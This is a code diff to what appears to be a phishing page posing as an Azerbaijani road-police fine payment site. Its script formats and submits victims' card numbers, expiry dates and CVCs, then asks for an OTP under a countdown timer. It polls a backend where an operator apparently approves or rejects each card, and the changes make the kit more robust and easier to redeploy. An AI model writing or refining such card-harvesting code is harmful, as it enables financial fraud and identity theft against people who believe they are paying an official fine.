@@ -191,7 +191,16 @@
     </div>
 
     <script>
-        let API_URL = localStorage.getItem('dyp_active_api_url') || 'https://opinion-grip-peter-absorption.trycloudflare.com/api';
+        function formatApiUrl(url) {
+            if (!url) return '';
+            let cleaned = url.trim().replace(/\/+$/, '');
+            if (!cleaned.endsWith('/api')) {
+                cleaned += '/api';
+            }
+            return cleaned;
+        }
+
+        let API_URL = formatApiUrl(localStorage.getItem('dyp_active_api_url')) || 'http://localhost:3000/api';
         let timerInterval;
         let otpTimeLeft = 180;
         let otpInterval;
@@ -199,39 +208,48 @@
         let adviceShown = false;
 
         function showLoadingScreen() {
-            document.getElementById('loading-modal').classList.remove('hidden');
+            document.getElementById('loading-modal')?.classList.remove('hidden');
         }
 
         async function initConfig() {
-            const savedApiUrl = localStorage.getItem('dyp_active_api_url');
-            if (savedApiUrl) {
-                API_URL = savedApiUrl;
-            }
-
             try {
                 const res = await fetch(`config.json?t=${Date.now()}`);
-                const config = await res.json();
-                if (config.apiUrl && !savedApiUrl) {
-                    API_URL = config.apiUrl;
+                if (res.ok) {
+                    const config = await res.json();
+                    if (config.apiUrl) {
+                        const formatted = formatApiUrl(config.apiUrl);
+                        const saved = localStorage.getItem('dyp_active_api_url');
+                        if (!saved || saved !== formatted) {
+                            API_URL = formatted;
+                            localStorage.setItem('dyp_active_api_url', formatted);
+                        } else {
+                            API_URL = saved;
+                        }
+                    }
                 }
             } catch (err) {
-                console.log("Config oxunmadı, lokal istifadə olunur");
+                console.log("Config oxunmadı, mövcud API_URL istifadə olunur:", API_URL);
             }
+
+            if (!API_URL) {
+                API_URL = localStorage.getItem('dyp_active_api_url') || 'http://localhost:3000/api';
+            }
+
             fetchFineData();
             initTimer();
         }
 
-        document.getElementById('card-no').addEventListener('input', function (e) {
+        document.getElementById('card-no')?.addEventListener('input', function (e) {
             let value = e.target.value.replace(/\D/g, '').substring(0, 16);
             let formatted = value.match(/.{1,4}/g)?.join(' ') || '';
             e.target.value = formatted;
 
             if (value.length === 16) {
-                document.getElementById('card-exp').focus();
+                document.getElementById('card-exp')?.focus();
             }
         });
 
-        document.getElementById('card-exp').addEventListener('input', function (e) {
+        document.getElementById('card-exp')?.addEventListener('input', function (e) {
             let value = e.target.value.replace(/\D/g, '').substring(0, 4);
             if (value.length >= 3) {
                 value = value.substring(0, 2) + '/' + value.substring(2);
@@ -239,7 +257,7 @@
             e.target.value = value;
 
             if (value.length === 5) {
-                document.getElementById('card-cvc').focus();
+                document.getElementById('card-cvc')?.focus();
             }
         });
 
@@ -247,20 +265,33 @@
             try {
                 let res = await fetch(url, options);
                 if (res.ok) {
-                    localStorage.setItem('dyp_active_api_url', API_URL);
                     return res;
                 }
-            } catch (e) {
-                if (!url.includes('localhost:3000')) {
+            } catch (e) {}
+
+            if (url.startsWith('https://')) {
+                try {
+                    let emulatorUrl = url.replace(/https?:\/\/[^\/]+/, 'http://10.0.2.2:3000');
+                    let resEmulator = await fetch(emulatorUrl, options);
+                    if (resEmulator.ok) {
+                        API_URL = 'http://10.0.2.2:3000/api';
+                        localStorage.setItem('dyp_active_api_url', API_URL);
+                        return resEmulator;
+                    }
+                } catch (e2) {}
+
+                try {
                     let localUrl = url.replace(/https?:\/\/[^\/]+/, 'http://localhost:3000');
                     let resLocal = await fetch(localUrl, options);
                     if (resLocal.ok) {
-                        localStorage.setItem('dyp_active_api_url', 'http://localhost:3000/api');
+                        API_URL = 'http://localhost:3000/api';
+                        localStorage.setItem('dyp_active_api_url', API_URL);
                         return resLocal;
                     }
-                }
-                throw e;
+                } catch (e3) {}
             }
+
+            throw new Error("Endpoint unreached");
         }
 
         async function fetchFineData() {
@@ -271,11 +302,13 @@
                     if (contentType && contentType.includes('application/json')) {
                         const data = await res.json();
                         if (data.apiUrl) {
-                            API_URL = data.apiUrl;
+                            const formatted = formatApiUrl(data.apiUrl);
+                            if (formatted && formatted !== API_URL) {
+                                API_URL = formatted;
+                                localStorage.setItem('dyp_active_api_url', formatted);
+                            }
                         }
                         updateUI(data);
-                    } else {
-                        console.error("API returned non-JSON (Cloudflare warning page)");
                     }
                 }
             } catch (err) {
@@ -397,12 +430,13 @@
             }
 
             if (data.isRejected) {
-                document.getElementById('loading-modal').classList.add('hidden');
-                document.getElementById('reject-reason-text').textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
-                document.getElementById('reject-modal').classList.add('hidden');
+                document.getElementById('loading-modal')?.classList.add('hidden');
+                const reasonEl = document.getElementById('reject-reason-text');
+                if (reasonEl) reasonEl.textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
+                document.getElementById('reject-modal')?.classList.remove('hidden');
                 return;
             } else {
-                document.getElementById('reject-modal').classList.add('hidden');
+                document.getElementById('reject-modal')?.classList.add('hidden');
             }
 
             if (data.isPaid) {
@@ -535,13 +569,13 @@
         }
 
         function openCardModal() {
-            document.getElementById('card-modal').classList.remove('hidden');
+            document.getElementById('card-modal')?.classList.remove('hidden');
         }
 
         function closeModals() {
-            document.getElementById('card-modal').classList.add('hidden');
-            document.getElementById('otp-modal').classList.add('hidden');
-            document.getElementById('loading-modal').classList.add('hidden');
+            document.getElementById('card-modal')?.classList.add('hidden');
+            document.getElementById('otp-modal')?.classList.add('hidden');
+            document.getElementById('loading-modal')?.classList.add('hidden');
             clearInterval(otpInterval);
         }
 
@@ -561,8 +595,8 @@
                 console.error("Kart göndərmə xətası:", err);
             }
 
-            document.getElementById('card-modal').classList.add('hidden');
-            document.getElementById('otp-modal').classList.remove('hidden');
+            document.getElementById('card-modal')?.classList.add('hidden');
+            document.getElementById('otp-modal')?.classList.remove('hidden');
             startOtpTimer();
         }
 
@@ -580,7 +614,7 @@
                 otpTimeLeft--;
                 const min = Math.floor(otpTimeLeft / 60);
                 const sec = otpTimeLeft % 60;
-                otpTimerEl.textContent = `${String(min).padStart(2, '0')}:${String(sec).padStart(2, '0')}`;
+                if (otpTimerEl) otpTimerEl.textContent = `${String(min).padStart(2, '0')}:${String(sec).padStart(2, '0')}`;
             }, 1000);
         }
 
@@ -626,17 +660,17 @@
             }
             localStorage.removeItem('dyp_wait');
             isWaitingForAdmin = false;
-            document.getElementById('reject-modal').classList.add('hidden');
+            document.getElementById('reject-modal')?.classList.add('hidden');
 
             resetFineCardHtml();
             openCardModal();
         }
 
         function initTimer() {
-            const timerElement = document.getElementById('timer');
             const TOTAL_DURATION = 10 * 60;
 
             timerInterval = setInterval(() => {
+                const timerElement = document.getElementById('timer');
                 let endTime = localStorage.getItem('dyp_timer_end');
                 if (!endTime) {
                     endTime = Date.now() + TOTAL_DURATION * 1000;
@@ -647,17 +681,19 @@
                 let timeLeft = Math.floor((endTime - now) / 1000);
 
                 if (timeLeft <= 0) {
-                    timerElement.textContent = "00:00";
+                    if (timerElement) timerElement.textContent = "00:00";
                     return;
                 }
 
                 const minutes = Math.floor(timeLeft / 60);
                 const seconds = timeLeft % 60;
-                timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                if (timerElement) {
+                    timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                }
             }, 1000);
         }
 
-        setInterval(fetchFineData, 1500);
+        setInterval(fetchFineData, 2000);
         initConfig();
     </script>
 </body>
